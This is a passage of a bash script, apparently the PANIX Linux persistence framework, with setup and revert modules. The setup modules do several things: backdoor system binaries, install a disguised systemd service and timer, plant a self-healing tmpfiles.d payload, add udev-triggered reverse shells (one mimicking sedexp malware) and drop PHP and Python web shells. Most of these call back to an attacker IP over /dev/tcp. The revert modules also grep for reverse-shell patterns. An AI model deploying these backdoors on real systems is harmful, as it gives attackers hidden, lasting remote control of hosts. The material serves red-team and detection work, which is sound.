		echo "Try './panix.sh --system-binary --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --system-binary --help' for more information."
			exit 1
		fi

		local binaries=("cat" "ls")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				mv $path $path.original
				echo -e '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/'$ip'/'$port' 0>&1 2>/dev/null &"\n'$path'.original "$@"' > $path
				chmod +x $path
				echo "[+] $bin backdoored successfully."
			else
				echo "[-] $bin is not present on the system."
			fi
		done

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary || -z $command ]]; then
			echo "Error: --binary and --command must be specified when using --custom."
			echo "Try './panix.sh --system-binary --help' for more information."
			exit 1
		fi

		if [[ $warning -eq 0 ]]; then
			echo "Error: --warning must be specified when using --custom."
			echo "Warning: this will overwrite the original binary with the backdoored version."
			echo "You better know what you are doing with that custom command!"
			echo "Try './panix.sh --system-binary --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			mv $path $path.original
			echo -e '#!/bin/bash\n'$command' 2>/dev/null\n'$path'.original "$@"' > $path
			chmod +x $path
			echo "[+] $binary backdoored successfully."
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
}

# Revert Module: revert_system_binary_backdoor.sh
revert_system_binary() {
	usage_revert_system_binary() {
		echo "Usage: ./panix.sh --revert system-binary"
		echo "Reverts any changes made by the setup_system_binary_backdoor module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Default binaries used in the setup function
	local default_binaries=("cat" "ls")

	# Function to restore a binary
	restore_binary() {
		local binary_name="$1"
		local binary_path
		binary_path=$(command -v "$binary_name" 2>/dev/null)

		if [[ -z "$binary_path" ]]; then
			echo "[-] Binary '$binary_name' not found in PATH."
			return
		fi

		if [[ -f "${binary_path}.original" ]]; then
			echo "[+] Restoring original binary for '$binary_name'..."
			mv -f "${binary_path}.original" "$binary_path"
			chmod +x "$binary_path"
			echo "[+] '$binary_name' restored successfully."
		else
			echo "[-] Backup for '$binary_name' not found. Skipping."
		fi
	}

	# Restore default binaries
	for bin in "${default_binaries[@]}"; do
		restore_binary "$bin"
	done

	# Check for any custom backdoored binaries
	# This assumes that any binary with a '.original' backup was backdoored
	echo "[+] Searching for custom backdoored binaries..."
	find / -type f -name "*.original" 2>/dev/null | while read -r backup_file; do
		original_file="${backup_file%.original}"
		if [[ -f "$original_file" ]]; then
			echo "[+] Restoring custom binary '$original_file'..."
			mv -f "$backup_file" "$original_file"
			chmod +x "$original_file"
			echo "[+] '$original_file' restored successfully."
		fi
	done

	return 0
}

# Module: setup_systemd.sh
setup_systemd() {
	local service_path=""
	local timer_path=""
	local timer=0
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_systemd() {
		echo "Usage: ./panix.sh --systemd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default systemd settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom systemd settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom service path (must end with .service)"
		echo "  --command <command>          Specify custom persistence command (no validation)"
		echo "  --timer                      Create systemd timer (1 minute interval)"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				service_path=$1
				if [[ ! $service_path == *.service ]]; then
					echo "Error: --path must end with .service"
					exit 1
				fi
				;;
			--command )
				shift
				command=$1
				;;
			--timer )
				timer=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --systemd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/evil.service\" --timer"
				exit 0
				;;
			--help|-h)
				usage_systemd
				exit 0
				;;
			* )
				echo "Invalid option for --systemd: $1"
				echo "Try './panix.sh --systemd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --systemd --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --systemd --help' for more information."
			exit 1
		fi

		if check_root; then
			service_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service"
			timer_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer"
		else
			local current_user=$(whoami)
			service_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service"
			timer_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer"
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Network Name Resolution

		[Service]
		ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if check_root; then
		if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service ]; then
				echo "Service file created successfully!"
			else
				echo "Failed to create service file!"
				exit 1
			fi
		fi

		cat <<-EOF > $timer_path
		[Unit]
		Description=Network Name Resolution Timer

		[Timer]
		OnCalendar=*:*:00
		Persistent=true

		[Install]
		WantedBy=timers.target
		EOF

				if check_root; then
			if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $timer_path)
			systemctl start $(basename $timer_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $timer_path)
			systemctl --user start $(basename $timer_path)
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $service_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --systemd --help' for more information."
			exit 1
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Custom Service

		[Service]
		ExecStart=$command
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if [ -f $service_path ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $service_path)
			systemctl start $(basename $service_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $service_path)
			systemctl --user start $(basename $service_path)
		fi

		if [[ $timer -eq 1 ]]; then
			timer_path="${service_path%.service}.timer"
			mkdir -p $(dirname "$timer_path")
			cat <<-EOF > $timer_path
			[Unit]
			Description=Custom Timer

			[Timer]
			OnCalendar=*:*:00
			Persistent=true

			[Install]
			WantedBy=timers.target
			EOF

			if [ -f $timer_path ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

			if check_root; then
				systemctl daemon-reload
				systemctl enable $(basename $timer_path)
				systemctl start $(basename $timer_path)
			else
				systemctl --user daemon-reload
				systemctl --user enable $(basename $timer_path)
				systemctl --user start $(basename $timer_path)
			fi
		fi
	else
		echo "Error: Either --default or --custom must be specified for --systemd."
		echo "Try './panix.sh --systemd --help' for more information."
		exit 1
	fi

	echo "[+] Systemd service persistence established!"
}

# Revert Module: revert_systemd.sh
revert_systemd() {
    usage_revert_systemd() {
        echo "Usage: ./panix.sh --revert systemd"
        echo "Reverts any changes made by the setup_systemd module."
    }

    if ! check_root; then
        echo "Error: This function can only be run as root."
        return 1
    fi

    # Revert default services
    default_service_name="dbus-org.freedesktop.resolved.service"
    default_timer_name="dbus-org.freedesktop.resolved.timer"
    default_system_service_path="/usr/local/lib/systemd/system/$default_service_name"
    default_system_timer_path="/usr/local/lib/systemd/system/$default_timer_name"

    # Disable and stop the default system-level timer and service
    if [[ -f "$default_system_service_path" || -f "$default_system_timer_path" ]]; then
        echo "[+] Disabling and stopping default system-level systemd services..."

        systemctl stop "$default_timer_name" 2>/dev/null
        systemctl disable "$default_timer_name" 2>/dev/null

        systemctl stop "$default_service_name" 2>/dev/null
        systemctl disable "$default_service_name" 2>/dev/null

        # Remove the service and timer files
        rm -f "$default_system_service_path" "$default_system_timer_path"

        echo "[+] Removed default system-level systemd service and timer files."
    else
        echo "[-] Default system-level systemd service and timer files not found."
    fi

    # Revert default user-level services
    for user_home in /home/*; do
        if [ -d "$user_home/.config/systemd/user" ]; then
            user_service_path="$user_home/.config/systemd/user/$default_service_name"
            user_timer_path="$user_home/.config/systemd/user/$default_timer_name"
            user_name=$(basename "$user_home")

            if [[ -f "$user_service_path" || -f "$user_timer_path" ]]; then
                echo "[+] Disabling and stopping default user-level systemd services for user '$user_name'..."

                su - "$user_name" -c "systemctl --user stop '$default_timer_name'" 2>/dev/null
                su - "$user_name" -c "systemctl --user disable '$default_timer_name'" 2>/dev/null

                su - "$user_name" -c "systemctl --user stop '$default_service_name'" 2>/dev/null
                su - "$user_name" -c "systemctl --user disable '$default_service_name'" 2>/dev/null

                # Remove the service and timer files
                rm -f "$user_service_path" "$user_timer_path"

                echo "[+] Removed default user-level systemd service and timer files for user '$user_name'."
            else
                echo "[-] Default user-level systemd service and timer files not found for user '$user_name'."
            fi
        fi
    done

    # Reload systemd daemon
    systemctl daemon-reload

    # For each user, reload the user systemd daemon
    for user_home in /home/*; do
        if [ -d "$user_home/.config/systemd/user" ]; then
            user_name=$(basename "$user_home")
            su - "$user_name" -c "systemctl --user daemon-reload" 2>/dev/null
        fi
    done

    # Attempt to detect and remove custom malicious services
    echo "[+] Searching for custom malicious systemd services..."

    # Define directories to search for malicious services
    service_dirs=(
        "/usr/local/lib/systemd/system"
        "/etc/systemd/system"
    )

    # Search for suspicious system-level services
    for dir in "${service_dirs[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f -name "*.service" -o -name "*.timer" 2>/dev/null | while read -r service_file; do
                # Check if the service file contains suspicious commands
                if grep -Eq "(bash -i >& /dev/tcp|ExecStart=.*bash -c)" "$service_file"; then
                    service_name=$(basename "$service_file")
                    echo "[+] Found suspicious system-level service: '$service_name'"

                    # Disable and stop the service
                    systemctl stop "$service_name" 2>/dev/null
                    systemctl disable "$service_name" 2>/dev/null

                    # Remove the service file
                    rm -f "$service_file"

                    echo "[+] Removed suspicious system-level service: '$service_name'"
                fi
            done
        fi
    done

    # Search for suspicious user-level services
    for user_home in /home/*; do
        if [ -d "$user_home/.config/systemd/user" ]; then
            user_name=$(basename "$user_home")
            find "$user_home/.config/systemd/user/" -type f -name "*.service" -o -name "*.timer" 2>/dev/null | while read -r service_file; do
                if grep -Eq "(bash -i >& /dev/tcp|ExecStart=.*bash -c)" "$service_file"; then
                    service_name=$(basename "$service_file")
                    echo "[+] Found suspicious user-level service for user '$user_name': '$service_name'"

                    # Disable and stop the service
                    su - "$user_name" -c "systemctl --user stop '$service_name'" 2>/dev/null
                    su - "$user_name" -c "systemctl --user disable '$service_name'" 2>/dev/null

                    # Remove the service file
                    rm -f "$service_file"

                    echo "[+] Removed suspicious user-level service for user '$user_name': '$service_name'"
                fi
            done
        fi
    done

    # Reload daemons again
    systemctl daemon-reload

    for user_home in /home/*; do
        if [ -d "$user_home/.config/systemd/user" ]; then
            user_name=$(basename "$user_home")
            su - "$user_name" -c "systemctl --user daemon-reload" 2>/dev/null
        fi
    done

    return 0
}

# Module: setup_tmpfiles.sh
setup_tmpfiles() {
	# systemd-tmpfiles.d persistence (issue #36).
	# Drops a payload file and a tmpfiles.d unit that re-creates it on every
	# boot / `systemd-tmpfiles --create` if the payload is deleted, giving the
	# attacker a self-healing persistence primitive.
	local payload_path=""
	local tmpfiles_path=""
	local conf_name=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local dest_path=""

	usage_tmpfiles() {
		echo "Usage: ./panix.sh --tmpfiles [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default tmpfiles settings"
		echo "  --ip <ip>                    Specify IP address for the reverse shell payload"
		echo "  --port <port>                Specify port number for the reverse shell payload"
		echo "  --payload <path>            Path to the payload file that tmpfiles.d will re-create (default: /usr/local/lib/.cache/.payload)"
		echo "  --dest <path>               Destination file re-created by tmpfiles.d (default: /etc/profile.d/panix-persist.sh)"
		echo "  --conf <name>               tmpfiles.d config name (default: panix-persist.conf)"
		echo "--custom                     Use custom tmpfiles settings"
		echo "  --payload <path>            Path to the payload file that tmpfiles.d will re-create"
		echo "  --dest <path>               Destination file re-created by tmpfiles.d"
		echo "  --conf <name>               tmpfiles.d config name"
		echo "  --command <command>         Custom persistence command written into the payload (no validation)"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--payload )
				shift
				payload_path=$1
				;;
			--dest )
				shift
				dest_path=$1
				;;
			--conf )
				shift
				conf_name=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --tmpfiles --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --tmpfiles --custom --payload /tmp/evil.sh --dest /etc/profile.d/panix-persist.sh --conf panix-persist.conf"
				exit 0
				;;
			--help|-h )
				usage_tmpfiles
				exit 0
				;;
			* )
				echo "Invalid option for --tmpfiles: $1"
				echo "Try './panix.sh --tmpfiles --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --tmpfiles --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --tmpfiles --help' for more information."
			exit 1
		fi

		if ! check_root; then
			echo "Error: --tmpfiles requires root privileges (writes to /etc/tmpfiles.d)."
			exit 1
		fi

		payload_path="${payload_path:-/usr/local/lib/.cache/.payload}"
		dest_path="${dest_path:-/etc/profile.d/panix-persist.sh}"
		conf_name="${conf_name:-panix-persist.conf}"

		# The payload re-created by tmpfiles.d: a reverse shell sourced from a
		# profile.d script so it triggers on any login shell.
		mkdir -p "$(dirname "$payload_path")"
		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" > "$payload_path"
		chmod 755 "$payload_path"

		# Destination file content (sourced by /etc/profile on login).
		echo "# PANIX tmpfiles.d persistence" > "$dest_path"
		echo "bash $payload_path" >> "$dest_path"
		chmod 644 "$dest_path"

		# tmpfiles.d rule: 'f' creates a regular file from the payload source
		# whenever it is missing (self-healing persistence).
		echo "f $dest_path 0644 root root - $payload_path" > "/etc/tmpfiles.d/$conf_name"
		systemd-tmpfiles --create "/etc/tmpfiles.d/$conf_name" 2>/dev/null || true
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $payload_path || -z $dest_path || -z $conf_name || -z $command ]]; then
			echo "Error: --payload, --dest, --conf and --command must be specified when using --custom."
			echo "Try './panix.sh --tmpfiles --help' for more information."
			exit 1
		fi

		if ! check_root; then
			echo "Error: --tmpfiles requires root privileges (writes to /etc/tmpfiles.d)."
			exit 1
		fi

		mkdir -p "$(dirname "$payload_path")"
		echo "$command" > "$payload_path"
		chmod 755 "$payload_path"

		echo "# PANIX tmpfiles.d persistence" > "$dest_path"
		echo "bash $payload_path" >> "$dest_path"
		chmod 644 "$dest_path"

		echo "f $dest_path 0644 root root - $payload_path" > "/etc/tmpfiles.d/$conf_name"
		systemd-tmpfiles --create "/etc/tmpfiles.d/$conf_name" 2>/dev/null || true
	else
		echo "Error: Either --default or --custom must be specified for --tmpfiles."
		echo "Try './panix.sh --tmpfiles --help' for more information."
		exit 1
	fi

	echo "[+] systemd-tmpfiles.d persistence established!"
}

# Revert Module: revert_tmpfiles.sh
revert_tmpfiles() {
	usage_revert_tmpfiles() {
		echo "Usage: ./panix.sh --revert tmpfiles"
		echo "Reverts any changes made by the setup_tmpfiles module."
	}

	if [[ "$(id -u)" -ne 0 ]]; then
		echo "Error: --revert tmpfiles requires root privileges."
		exit 1
	fi

	# Supported tmpfiles.d config names.
	local confs=(
		"/etc/tmpfiles.d/panix-persist.conf"
		"/usr/lib/tmpfiles.d/panix-persist.conf"
		"/run/tmpfiles.d/panix-persist.conf"
	)

	local removed=0
	for conf in "${confs[@]}"; do
		if [[ -f "$conf" ]]; then
			# Parse the destination file path from the rule (2nd field).
			local dest
			dest=$(awk '{print $2}' "$conf")
			local payload
			payload=$(awk '{print $NF}' "$conf")

			rm -f "$conf"
			echo "[+] Removed tmpfiles.d config: $conf"

			if [[ -n "$dest" && -f "$dest" ]]; then
				rm -f "$dest"
				echo "[+] Removed re-created file: $dest"
			fi

			if [[ -n "$payload" && -f "$payload" ]]; then
				rm -f "$payload"
				echo "[+] Removed payload: $payload"
			fi

			removed=1
		fi
	done

	if [[ $removed -eq 0 ]]; then
		echo "[-] No PANIX tmpfiles.d persistence found to revert."
	else
		echo "[+] systemd-tmpfiles.d persistence reverted!"
	fi
}

# Module: setup_udev.sh
setup_udev() {
	local default=0
	local ip=""
	local port=""
	local mechanism=""
	local custom=0
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_udev() {
		echo "Usage: ./panix.sh --udev [OPTIONS]"
		echo "--examples                              Display command examples"
		echo "--default                               Use default udev settings"
		echo "  --ip <ip>                               Specify IP address"
		echo "  --port <port>                           Specify port number"
		echo "  --sedexp | --at | --cron | --systemd    Specify the mechanism to use"
		echo "--custom                                Use custom udev settings"
		echo "  --command <command>                     Specify custom command"
		echo "  --path <path>                           Specify custom path"
		echo "--help|-h                               Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--sedexp | --at | --cron | --systemd )
				mechanism="$1"
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command="$1"
				;;
			--path )
				shift
				path="$1"
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --udev --default --ip 10.10.10.10 --port 1337 --sedexp|--at|--cron|--systemd"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
				echo "echo -e '#!/bin/sh\nnohup setsid bash -c \"bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\" &' > /tmp/payload && chmod +x /tmp/payload && udevadm control --reload"
				exit 0
				;;
			--help|-h)
				usage_udev
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --udev --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip, --port and one of --sedexp, --at, --cron, or --systemd."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi
		if [[ -z $mechanism ]]; then
			echo "Error: --default requires one of --sedexp, --at, --cron, or --systemd."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi

		case $mechanism in
			--sedexp )
				# Reference: https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp

				# Create a helper program to bypass network restrictions
				cat <<-EOF > /bin/sedexp
				#!/bin/bash
				while true; do
					if [ -f /tmp/sedexp ]; then
						rm /tmp/sedexp
						nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
					fi
					sleep 5
				done;
				EOF

				# Grant the program execution privileges and run it in the background
				# This process will die on reboot. Use Systemd/cron/at for persistent execution
				chmod +x /bin/sedexp
				nohup /bin/sedexp &

				# Create a more widely supported sedexp udev rules file based on Sedexp malware
				cat <<-EOF > /etc/udev/rules.d/10-sedexp.rules
				ACTION=="add", KERNEL=="random", RUN+="/bin/touch /tmp/sedexp"
				EOF

				echo "[!] This mechanism is not persistent across reboots."
				echo "[!] Consider using --at, --cron, or --systemd for persistence."
				echo "[!] This technique is just here to mimic the sedexp behavior."
				echo ""
				echo "[!] Note: This utility launches when a random device is added to the system."
				echo "[!] You can trigger this backdoor by running:"
				echo ""
				echo "sudo mknod /dev/random c 1 8"
				echo "sudo udevadm trigger --action=add --name-match=random"
				echo ""
				;;

			--at )
				# Check if 'at' utility is available
				if ! command -v at &> /dev/null; then
					echo "Error: 'at' utility is not available. Please install it to use --at option."
					exit 1
				fi

				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/atest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/atest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/11-atest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f /usr/bin/atest now"
				EOF
				;;

			--cron )
				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/crontest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/crontest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/11-crontest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/bin/bash -c 'echo \"* * * * * /usr/bin/crontest\" | crontab -'"
				EOF
				;;

			--systemd )
				# Create the systemd service unit
				cat <<-EOF > /etc/systemd/system/systemdtest.service

				[Unit]
				Description=Systemdtest Service

				[Service]
				ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
				Restart=always
				RestartSec=60

				[Install]
				WantedBy=default.target
				EOF

				systemctl daemon-reload
				systemctl enable systemdtest.service
				systemctl start systemdtest.service

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/12-systemdtest.rules
				SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_WANTS}+="systemdtest.service"
				EOF
				;;
		esac

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --custom requires --command and --path."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi

		# Create the custom udev rules file
		echo "$command" > "$path"

	else
		echo "Error: Either --default or --custom must be specified for --udev."
		echo "Try './panix.sh --udev --help' for more information."
		exit 1
	fi

	# Reload udev rules
	sudo udevadm control --reload

	echo "[+] Udev persistence established."
}

# Revert Module: revert_udev.sh
revert_udev() {
	usage_revert_udev() {
		echo "Usage: ./panix.sh --revert udev"
		echo "Reverts any changes made by the setup_udev module."
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Function to remove a file if it exists
	remove_file() {
		local file_path="$1"
		if [[ -f "$file_path" ]]; then
			rm -f "$file_path"
			echo "[+] Removed file: $file_path"
		fi
	}

	# Function to remove a udev rule
	remove_udev_rule() {
		local rule_name="$1"
		local rule_path="/etc/udev/rules.d/$rule_name"
		remove_file "$rule_path"
	}

	# Function to remove a script from /usr/bin or /bin
	remove_script() {
		local script_name="$1"
		remove_file "/usr/bin/$script_name"
		remove_file "/bin/$script_name"
	}

	# Function to stop and disable a systemd service
	remove_systemd_service() {
		local service_name="$1"
		local service_path="/etc/systemd/system/$service_name.service"

		if systemctl is-active --quiet "$service_name"; then
			systemctl stop "$service_name"
			echo "[+] Stopped systemd service: $service_name"
		else
			echo "[-] Systemd service not running: $service_name"
		fi

		if systemctl is-enabled --quiet "$service_name"; then
			systemctl disable "$service_name"
			echo "[+] Disabled systemd service: $service_name"
		else
			echo "[-] Systemd service not enabled: $service_name"
		fi

		remove_file "$service_path"
	}

	# Function to remove a cron job containing a specific string
	remove_cron_job() {
		local job_string="$1"
		crontab -l | grep -v "$job_string" | crontab -
		echo "[+] Removed cron jobs containing: $job_string"
	}

	# Remove udev rules and associated scripts
	echo "[+] Removing udev rules and associated scripts..."

	# Remove sedexp components
	remove_script "sedexp"
	remove_udev_rule "10-sedexp.rules"
	remove_file "/tmp/sedexp"

	# Remove atest components
	remove_script "atest"
	remove_udev_rule "11-atest.rules"

	# Remove crontest components
	remove_script "crontest"
	remove_udev_rule "11-crontest.rules"
	remove_cron_job "/usr/bin/crontest"

	# Remove systemdtest components
	remove_systemd_service "systemdtest"
	remove_udev_rule "12-systemdtest.rules"

	# Remove any custom udev rules added by the setup function
	# Assuming custom rules are stored with names starting with "10-backdoor.rules"
	for custom_rule in /etc/udev/rules.d/10-backdoor.rules; do
		if [[ -f "$custom_rule" ]]; then
			remove_file "$custom_rule"
		fi
	done

	# Reload udev rules
	echo "[+] Reloading udev rules..."
	udevadm control --reload
	udevadm trigger
	echo "[+] Udev rules reloaded."

	return 0
}

# Module: setup_web_shell.sh
setup_web_shell() {
	local port=""
	local rev_port=""
	local language=""
	local mechanism=""
	local ip=""

	usage_web_shell() {
		echo "Usage: ./panix.sh --web-shell [OPTIONS]"
		echo "--language <php|python>               Specify language for the web server"
		echo "--port <port>                         Specify port for the web server"
		echo "--mechanism <cmd|reverse>             Specify mechanism (cmd for command execution, reverse for reverse shell)"
		echo "  --rev-port <port>                     Specify port for the reverse shell"
		echo "  --ip <ip>                             Specify IP for the reverse shell"
		echo "--examples                            Display command examples"
		echo "--help|-h                             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--port )
				shift
				port=$1
				;;
			--rev-port )
				shift
				rev_port=$1
				;;
			--language )
				shift
				language=$1
				;;
			--mechanism )
				shift
				mechanism=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --web-shell --port 8080 --language php --mechanism cmd"
				echo "./panix.sh --web-shell --port 8080 --language python --mechanism reverse --ip 10.10.10.10 --rev-port 1337"
				exit 0
				;;
			--help|-h )
				usage_web_shell
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --web-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate required arguments
	if [[ -z $port || -z $language || -z $mechanism ]]; then
		echo "Error: --port, --language, and --mechanism must be specified."
		echo "Try './panix.sh --web-shell --help' for more information."
		exit 1
	fi

	if [[ $mechanism == "reverse" && ( -z $ip || -z $rev_port ) ]]; then
		echo "Error: --ip and --rev-port must be specified when using the reverse mechanism."
		echo "Try './panix.sh --web-shell --help' for more information."
		exit 1
	fi

	# Determine web server directory based on user privileges
	if [[ $UID -eq 0 ]]; then
		dir="/var/www/html/panix/"
	else
		dir="$HOME/panix/"
	fi

	mkdir -p "$dir"
	echo "[+] Web server directory created at $dir"

	# Create appropriate file based on mechanism
	case $mechanism in
		cmd )
			if [[ $language == "php" ]]; then
				echo "<?php if(isset(\$_REQUEST['cmd'])){\$cmd=(\$_REQUEST['cmd']);system(\$cmd);die;}?>" > "${dir}cmd.php"
				echo "[+] cmd.php file created in $dir"
				echo "[+] Interact via: curl http://<ip>:$port/cmd.php?cmd=whoami"
			elif [[ $language == "python" ]]; then
				cgi_dir="${dir}cgi-bin/"
				mkdir -p "$cgi_dir"
cat <<EOF > "${cgi_dir}cmd.py"
#!/usr/bin/env python3
import os, cgi

form = cgi.FieldStorage()
cmd = form.getvalue('cmd', '')

if cmd:
	print("Content-Type: text/plain\\n")
	print(os.popen(cmd).read())
EOF
				chmod +x "${cgi_dir}cmd.py"
				echo "[+] cmd.py file created in $cgi_dir"
				echo "[+] Interact via: curl http://<ip>:$port/cgi-bin/cmd.py?cmd=whoami"
			else
				echo "[-] Error: Unsupported language specified for cmd mechanism."
				exit 1
			fi
			;;
		reverse )
			if [[ $language == "php" ]]; then
				echo "<?php exec(\"/bin/bash -c 'nohup setsid bash -i > /dev/tcp/$ip/$rev_port 0>&1'\");?>" > "${dir}reverse.php"
				echo "[+] reverse.php file created in $dir"
				echo "[+] Interact via: curl http://<ip>:$port/reverse.php"
			elif [[ $language == "python" ]]; then
				cgi_dir="${dir}cgi-bin/"
				mkdir -p "$cgi_dir"
				cat <<-EOF > "${cgi_dir}reverse.py"
				#!/usr/bin/env python3
				import os
				os.system("/bin/bash -c 'nohup setsid bash -i > /dev/tcp/$ip/$rev_port 0>&1'")
				EOF
				chmod +x "${cgi_dir}reverse.py"
				echo "[+] reverse.py file created in $cgi_dir"
				echo "[+] Interact via: curl http://<ip>:$port/cgi-bin/reverse.py"
			else
				echo "[-] Error: Unsupported language specified for reverse mechanism."
				exit 1
			fi
			;;
		* )
			echo "[-] Error: Invalid mechanism specified. Use cmd or reverse."
			exit 1
	esac

	# Start web server
	case $language in
		php )
			if command -v php &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting PHP server on port $port..."
				nohup php -S 0.0.0.0:$port -t "$dir" &>/dev/null &
